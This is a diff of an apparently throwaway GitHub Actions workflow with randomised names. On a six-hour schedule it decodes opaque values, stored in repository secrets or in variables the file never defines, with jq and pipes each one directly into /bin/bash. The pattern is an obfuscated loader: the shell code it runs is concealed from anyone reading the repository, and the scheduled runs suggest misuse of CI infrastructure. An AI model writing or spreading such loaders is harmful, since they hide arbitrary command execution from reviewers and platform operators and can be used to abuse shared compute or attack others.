@@ -1,25 +1,23 @@
 name: luoshantou8765
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '36 4/6 * * *'
-
+    - cron: '15 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: luoshantou8765
         env:
-          vp7: ${{ secrets.vp7 }}
+          z71211: ${{ secrets.z71211 }}
         run: |
-          echo $vp7 | jq -r .iha161 | /bin/bash
-          echo $c26478 | jq -r .msyc9 | /bin/bash
-          echo $yy1 | jq -r .xgx248 | /bin/bash
-          echo $wauu7295 | jq -r .cv26 | /bin/bash
-          echo $hbxra8907 | jq -r .fhvd8430 | /bin/bash
-          echo $qyb66531 | jq -r .cw574 | /bin/bash
-          echo $a3 | jq -r .nns71847 | /bin/bash
-          echo $ifqol80425 | jq -r .eb22 | /bin/bash
-          echo $lji9 | jq -r .jnh13 | /bin/bash
+          echo $z71211 | jq -r .cdqj9093 | /bin/bash
+          echo $hvb93648 | jq -r .vcele77215 | /bin/bash
+          echo $kh0 | jq -r .ne530 | /bin/bash
+          echo $dvsed83 | jq -r .z5 | /bin/bash
+          echo $eef1 | jq -r .dx55 | /bin/bash
+          echo $asr6803 | jq -r .r78 | /bin/bash
 
